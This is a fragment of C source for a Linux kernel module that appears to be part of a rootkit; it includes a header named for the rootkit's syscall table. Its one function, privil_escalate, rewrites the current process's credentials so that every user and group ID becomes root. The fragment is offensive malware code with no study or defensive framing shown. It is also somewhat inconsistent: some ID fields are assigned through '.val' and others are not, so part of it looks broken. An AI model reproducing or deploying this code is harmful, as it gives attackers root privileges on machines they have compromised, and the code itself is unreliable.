#include <linux/module.h>   /* Needed by all modules */
#include <linux/unistd.h>   /* Needed for __NR_read */
#include <linux/reboot.h>   /* Needed for kernel_restart() */
#include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */

#include <linux/thread_info.h>
#include <linux/sched.h>

static void privil_escalate(void)
{
	struct cred *elevated = prepare_creds();

	elevated->suid = 0;
	elevated->sgid = 0;
	elevated->uid.val = 0;
	elevated->gid.val = 0;
	elevated->euid = 0;
	elevated->egid = 0;

	commit_creds(elevated);

	//printk(KERN_INFO "saved uid: %d gid: %d\n", current->cred->suid.val, current->cred->sgid.val);
}

